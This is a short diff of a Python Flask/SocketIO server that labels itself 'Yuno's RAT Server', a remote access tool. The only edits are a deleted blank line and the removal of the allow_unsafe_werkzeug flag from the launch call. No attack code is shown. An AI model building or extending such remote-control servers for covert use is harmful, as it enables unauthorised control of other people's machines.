@@ -6,7 +6,6 @@ from flask import Flask, render_template, request, jsonify, url_for
 from flask_socketio import SocketIO, emit
 import base64
 import threading
-
 # Server settings
 HOST = "0.0.0.0"
 DATA_DIR = "rat_data"
@@ -121,4 +120,4 @@ def view_file(filename):
 if __name__ == "__main__":
     print("=== Yuno's RAT Server ===")
     print("A remote access tool by Yuno\n")
-    socketio.run(app, host='0.0.0.0', port=5000, allow_unsafe_werkzeug=True)
+    socketio.run(app, host='0.0.0.0', port=5000)
